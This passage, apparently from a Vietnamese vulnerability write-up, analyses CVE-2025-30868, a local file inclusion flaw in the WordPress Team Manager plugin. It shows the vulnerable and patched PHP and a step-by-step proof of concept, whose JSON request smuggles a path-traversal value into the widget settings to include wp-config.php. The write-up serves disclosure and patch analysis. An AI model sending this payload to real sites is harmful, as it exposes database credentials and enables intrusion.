0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function renderElementorLayout(string $layout, array $data, array $settings): void&#xA;{&#xA;    $styleTypeKey = &amp;#34;{$layout}_style_type&amp;#34;;&#xA;    $styleType = stripslashes($settings[$styleTypeKey]);&#xA;    $path = stripslashes(TM_PATH . &amp;#39;/public/templates/elementor/layouts/&amp;#39; . $layout . &amp;#39;/&amp;#39;);&#xA;    $templateName = sanitize_file_name( $styleType . &amp;#39;.php&amp;#39; );&#xA;    //allowed file type&#xA;    $allowedFileTypes = [&#xA;        &amp;#39;php&amp;#39;&#xA;    ];&#xA;    $ext = pathinfo($path . $templateName, PATHINFO_EXTENSION);&#xA;    if (in_array($ext, $allowedFileTypes)) {&#xA;        if (file_exists($path . $templateName)) {&#xA;            include self::locateTemplate($templateName, &amp;#39;&amp;#39;, $path);&#xA;        }&#xA;    }&#xA;&#xA;}&#xA;&#xA;private static function locateTemplate(string $templateName, string $templatePath = &amp;#39;&amp;#39;, string $defaultPath = &amp;#39;&amp;#39;): string&#xA;{&#xA;    $templatePath = $templatePath ?: &amp;#39;public/templates&amp;#39;;&#xA;    $defaultPath = $defaultPath ?: TM_PATH . &amp;#39;/public/templates/&amp;#39;;&#xA;    $template = locate_template(trailingslashit($templatePath) . $templateName);&#xA;    return $template ?: &amp;#34;{$defaultPath}{$templateName}&amp;#34;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, hàm &lt;code&gt;renderElementorLayout()&lt;/code&gt; không xác thực giá trị đầu vào. &lt;strong&gt;attacker&lt;/strong&gt; có thể vượt qua logic trên khi kiểm soát được &lt;code&gt;$layout&lt;/code&gt; và &lt;code&gt;$settings&lt;/code&gt;, ví dụ:&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Trong hàm &lt;code&gt;renderElementorLayout()&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$layout = &amp;quot;../../../../../../..&amp;quot;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$settings[&#39;../../../../../../.._style_type&#39;] = &amp;quot;wp-config&amp;quot;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Khi đó:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$styleType = &#39;wp-config&#39;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$path = TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../&#39;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$templateName=wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$path . $templateName = TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/debug1.png&#34;&#xA;    alt=&#34;Debugger giá trị của các biến&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debugger giá trị của các biến&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Sau khi vượt qua các mệnh đề &lt;code&gt;if&lt;/code&gt; thì &lt;code&gt;include&lt;/code&gt; giá trị trả về của &lt;code&gt;locateTemplate(wp-config.php, &#39;&#39;, TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../&#39;)&lt;/code&gt; :&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function locateTemplate(string $templateName, string $templatePath = &amp;#39;&amp;#39;, string $defaultPath = &amp;#39;&amp;#39;): string&#xA;{&#xA;    $templatePath = $templatePath ?: &amp;#39;public/templates&amp;#39;;&#xA;    $defaultPath = $defaultPath ?: TM_PATH . &amp;#39;/public/templates/&amp;#39;;&#xA;    $template = locate_template(trailingslashit($templatePath) . $templateName);&#xA;    return $template ?: &amp;#34;{$defaultPath}{$templateName}&amp;#34;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi đó:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$templatePath = public/templates&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$defaultPath = TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../&#39;&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$locate_template = locate_template(&#39;public/templates/wp-config.php&#39;) = &amp;quot;&amp;quot;&lt;/code&gt; - &lt;a href=&#34;https://developer.wordpress.org/reference/functions/locate_template/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;locate_template()&lt;/a&gt; sẽ trả về đường dẫn tuyệt đối của file nếu tìm thấy, ngược lại trả về chuỗi rỗng &lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Khi &lt;code&gt;$locate_template&lt;/code&gt; rỗng thì trả về  &lt;code&gt;TM_PATH . &#39;/public/templates/elementor/layouts/../../../../../../../wp-config.php&#39;&lt;/code&gt; để &lt;code&gt;include&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function renderElementorLayout(string $layout, array $data, array $settings): void&#xA;{&#xA;    $allowedLayouts = [&amp;#39;grid&amp;#39;, &amp;#39;list&amp;#39;, &amp;#39;slider&amp;#39;, &amp;#39;table&amp;#39;, &amp;#39;isotope&amp;#39;]; // Allowed layouts&#xA;&#xA;    if (!in_array($layout, $allowedLayouts, true)) {&#xA;        wp_die(__(&amp;#39;Invalid layout.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;    }&#xA;&#xA;    $styleTypeKey = &amp;#34;{$layout}_style_type&amp;#34;;&#xA;    $styleType = $settings[$styleTypeKey] ?? &amp;#39;&amp;#39;;&#xA;&#xA;    // Ensure only safe characters (alphanumeric &amp;#43; underscores)&#xA;    if (!preg_match(&amp;#39;/^[a-zA-Z0-9_-]&amp;#43;$/&amp;#39;, $styleType)) {&#xA;        wp_die(__(&amp;#39;Invalid style type.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;    }&#xA;&#xA;    // Ensure constants exist before using them&#xA;    if (!defined(&amp;#39;TM_PATH&amp;#39;)) {&#xA;        wp_die(__(&amp;#39;TM_PATH is not defined.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;    }&#xA;&#xA;    // Define Free path (always available)&#xA;    $basePath = realpath(TM_PATH . &amp;#39;/public/templates/elementor/layouts/&amp;#39;);&#xA;&#xA;    // Define Pro path if available&#xA;    $proPath = defined(&amp;#39;TM_PRO_PATH&amp;#39;) ? realpath(TM_PRO_PATH . &amp;#39;/public/templates/elementor/layouts/&amp;#39;) : null;&#xA;&#xA;    // Ensure the free path is valid&#xA;    if (!$basePath) {&#xA;        wp_die(__(&amp;#39;Invalid base template path.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;    }&#xA;&#xA;    $templateName = sanitize_file_name($styleType . &amp;#39;.php&amp;#39;);&#xA;&#xA;    // Define possible template paths (Pro first, then Free)&#xA;    $proFullPath = $proPath ? $proPath . &amp;#39;/&amp;#39; . $layout . &amp;#39;/&amp;#39; . $templateName : null;&#xA;    $freeFullPath = $basePath . &amp;#39;/&amp;#39; . $layout . &amp;#39;/&amp;#39; . $templateName;&#xA;&#xA;    // Check if Pro template exists and is readable&#xA;    if ($proFullPath &amp;amp;&amp;amp; is_readable($proFullPath) &amp;amp;&amp;amp; strpos(realpath($proFullPath), $proPath) === 0) {&#xA;        include $proFullPath;&#xA;        return;&#xA;    }&#xA;&#xA;    // Check if Free template exists and is readable&#xA;    if (is_readable($freeFullPath) &amp;amp;&amp;amp; strpos(realpath($freeFullPath), $basePath) === 0) {&#xA;        include $freeFullPath;&#xA;        return;&#xA;    }&#xA;&#xA;    // If neither file is found, show an error&#xA;    wp_die(__(&amp;#39;Template not found or invalid file.&amp;#39;, &amp;#39;wp-team-manager&amp;#39;));&#xA;}&#xA;&#xA;private static function locateTemplate(string $templateName, string $templatePath = &amp;#39;&amp;#39;, string $defaultPath = &amp;#39;&amp;#39;): string&#xA;{&#xA;    // Ensure template name is safe (allow only alphanumeric, dashes, and underscores)&#xA;    if (!preg_match(&amp;#39;/^[a-zA-Z0-9_-]&amp;#43;\.php$/&amp;#39;, $templateName)) {&#xA;        die(&amp;#39;Invalid template name.&amp;#39;);&#xA;    }&#xA;&#xA;    $templatePath = $templatePath ?: &amp;#39;public/templates&amp;#39;;&#xA;    $defaultPath = $defaultPath ?: TM_PATH . &amp;#39;/public/templates/&amp;#39;;&#xA;&#xA;    // Ensure paths are properly resolved&#xA;    $resolvedDefaultPath = realpath($defaultPath);&#xA;    $resolvedTemplatePath = realpath(trailingslashit($templatePath));&#xA;&#xA;    // Validate resolved paths&#xA;    if (!$resolvedDefaultPath || strpos($resolvedDefaultPath, realpath(TM_PATH . &amp;#39;/public/templates/&amp;#39;)) !== 0) {&#xA;        die(&amp;#39;Invalid default path.&amp;#39;);&#xA;    }&#xA;&#xA;    if ($resolvedTemplatePath &amp;amp;&amp;amp; strpos($resolvedTemplatePath, realpath(TM_PATH . &amp;#39;/public/templates/&amp;#39;)) === 0) {&#xA;        $template = locate_template($resolvedTemplatePath . &amp;#39;/&amp;#39; . $templateName);&#xA;        if ($template &amp;amp;&amp;amp; file_exists($template)) {&#xA;            return $template;&#xA;        }&#xA;    }&#xA;&#xA;    // Build the final safe path&#xA;    $finalPath = $resolvedDefaultPath . &amp;#39;/&amp;#39; . $templateName;&#xA;&#xA;    // Ensure the final path is within the allowed directory&#xA;    if (file_exists($finalPath) &amp;amp;&amp;amp; strpos(realpath($finalPath), $resolvedDefaultPath) === 0) {&#xA;        return $finalPath;&#xA;    }&#xA;&#xA;    die(&amp;#39;Template not found or invalid.&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã áp dụng xác thực đầu vào nghiêm ngặt, kiểm tra đường dẫn tuyệt đối, và hạn chế layout hợp lệ, giúp loại bỏ hoàn toàn khả năng khai thác file ngoài phạm vi cho phép =&amp;gt; ngăn &lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Chữ &lt;strong&gt;Elementor&lt;/strong&gt; trong tên hàm &lt;code&gt;renderElementorLayout()&lt;/code&gt; liên quan đến plugin &lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Elementor plugin&lt;/strong&gt;&lt;/a&gt; trong WordPress, dùng để tạo nội dung cho &lt;strong&gt;post&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Khi gửi request chỉnh sửa post chứa &lt;strong&gt;widgets Team Manager&lt;/strong&gt; này hoặc mở post sau khi lưu thì &lt;code&gt;renderElementorLayout()&lt;/code&gt; sẽ được gọi.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/plugin_element.png&#34;&#xA;    alt=&#34;Plugin element trong Elementor&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Plugin element trong Elementor&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Bắt request chỉnh sửa bằng BurpSuite:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/setting.png&#34;&#xA;    alt=&#34;Key settings trong request&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Key settings trong request&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Quan sát ta thấy có key &lt;code&gt;settings&lt;/code&gt; chứa các key &lt;code&gt;layout_type&lt;/code&gt; và &lt;code&gt;{layout_type_value}_stype_type&lt;/code&gt; tương ứng với code ta phân tích ở trên:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$styleTypeKey = &amp;#34;{$layout}_style_type&amp;#34;;&#xA;$styleType = stripslashes($settings[$styleTypeKey]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Ta có thể kiểm soát các giá trị ở đây.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Tạo team mới tại endpoint: &lt;code&gt;wp-admin/post-new.php?post_type=team_manager&lt;/code&gt; vì khi có team thì mới có giá trị để thêm vào layout của &lt;strong&gt;widget Team Manager&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Tạo post bằng &lt;strong&gt;Elementor&lt;/strong&gt;, thêm &lt;strong&gt;widgets Team Manager&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/widgets.png&#34;&#xA;    alt=&#34;Thêm Team Manager widget vào post&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Thêm Team Manager widget vào post&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-3&#34;&gt;&lt;span&gt;Step 3&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-3&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;Submit&lt;/strong&gt;, bắt request bằng &lt;strong&gt;BurpSuite&lt;/strong&gt; gửi đến &lt;strong&gt;Repeater&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-4&#34;&gt;&lt;span&gt;Step 4&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-4&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Bôi đen giá trị của param &lt;code&gt;action&lt;/code&gt;,sửa payload tại &lt;strong&gt;tab Inspector&lt;/strong&gt; và gửi lại request&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;save_builder&amp;#34;: {&#xA;    &amp;#34;action&amp;#34;: &amp;#34;save_builder&amp;#34;,&#xA;    &amp;#34;data&amp;#34;: {&#xA;      &amp;#34;status&amp;#34;: &amp;#34;pending&amp;#34;,&#xA;      &amp;#34;elements&amp;#34;: [&#xA;        {&#xA;          &amp;#34;id&amp;#34;: &amp;#34;e9249f1&amp;#34;,&#xA;          &amp;#34;elType&amp;#34;: &amp;#34;container&amp;#34;,&#xA;          &amp;#34;isInner&amp;#34;: false,&#xA;          &amp;#34;isLocked&amp;#34;: false,&#xA;          &amp;#34;settings&amp;#34;: {},&#xA;          &amp;#34;elements&amp;#34;: [&#xA;            {&#xA;              &amp;#34;id&amp;#34;: &amp;#34;3e7c95b&amp;#34;,&#xA;              &amp;#34;elType&amp;#34;: &amp;#34;widget&amp;#34;,&#xA;              &amp;#34;isInner&amp;#34;: false,&#xA;              &amp;#34;isLocked&amp;#34;: false,&#xA;              &amp;#34;settings&amp;#34;: {&#xA;                &amp;#34;layout_type&amp;#34;: &amp;#34;../../../../../../..&amp;#34;,&#xA;                &amp;#34;../../../../../../.._style_type&amp;#34;: &amp;#34;wp-config&amp;#34;&#xA;              },&#xA;              &amp;#34;elements&amp;#34;: [],&#xA;              &amp;#34;widgetType&amp;#34;: &amp;#34;wtm-team-manager&amp;#34;&#xA;            }&#xA;          ]&#xA;        },&#xA;        {&#xA;          &amp;#34;id&amp;#34;: &amp;#34;b132b28&amp;#34;,&#xA;          &amp;#34;elType&amp;#34;: &amp;#34;container&amp;#34;,&#xA;          &amp;#34;isInner&amp;#34;: false,&#xA;          &amp;#34;isLocked&amp;#34;: false,&#xA;          &amp;#34;settings&amp;#34;: {},&#xA;          &amp;#34;elements&amp;#34;: []&#xA;        }&#xA;      ],&#xA;      &amp;#34;settings&amp;#34;: {&#xA;        &amp;#34;post_title&amp;#34;: &amp;#34;Team&amp;#34;,&#xA;        &amp;#34;post_status&amp;#34;: &amp;#34;pending&amp;#34;&#xA;      }&#xA;    }&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Debugger đã nhảy đến &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/result.png&#34;&#xA;    alt=&#34;Kết quả LFI thành công&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả LFI thành công&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 